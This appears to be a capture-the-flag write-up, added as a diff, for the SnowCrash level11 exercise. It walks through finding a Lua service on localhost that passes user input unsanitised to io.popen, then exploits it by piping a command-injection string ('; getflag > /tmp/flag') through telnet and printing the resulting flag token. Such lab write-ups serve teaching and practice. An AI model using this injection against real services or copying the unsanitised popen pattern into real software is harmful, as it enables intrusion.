@@ -1,0 +1,82 @@
+In this level we have lua script in the home directory.
+
+We can execute it by launching :
+
+lua level11.lua
+
+Outputing this :
+
+lua: level11.lua:3: address already in use
+stack traceback:
+	[C]: in function 'assert'
+	level11.lua:3: in main chunk
+	[C]: ?
+
+Ok let's open the lua file and see what's inside.
+It's doing something on the port 5151 of localhost (our machine)
+
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+
+It also hashes something with the hash function, something is an input received.
+And it calls popen
+
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+
+This call to popen seems to insert "pass" to the echo command and I think "pass"
+is the user input.
+
+But how do we listen to port 5151 if that's we need to do ?
+We already used nc and when we did our research we found another tool : telnet
+Let's try this one this time
+
+level11@SnowCrash:~$ telnet localhost 5151
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Password:
+
+I am supposed to give a password but which one ??
+There is a check in the lua file with a hash, made from sha1 let's decrypt it :
+
+This hash : f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
+Revert to this string : NotSoEasy
+
+Is it the password ?
+Of course not lol
+
+This password thing is here to brain us, it'a trap ! We need to work on the echo
+thing.
+
+Let's try to call telnet and brain the password reading by giving command to it
+
+level11@SnowCrash:~$ telnet localhost 5151
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Password:  ; getflag > /tmp/flag
+Erf nope..
+Connection closed by foreign host.
+
+Nope it's not that.
+Hum and if we gave the telnet an argument before ?
+
+echo "; getflag > /tmp/flag" telnet localhost 5151
+
+Nothing from that.
+
+And with a pipe ? We call echo with our specific string for lua to receive it assert
+an argument like that :
+
+level11@SnowCrash:~$ echo "; getflag > /tmp/flag" | telnet localhost 5151
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+Password: Connection closed by foreign host.
+
+No error message, let's open our tmp file :
+
+level11@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+It worked, we have the flag!!
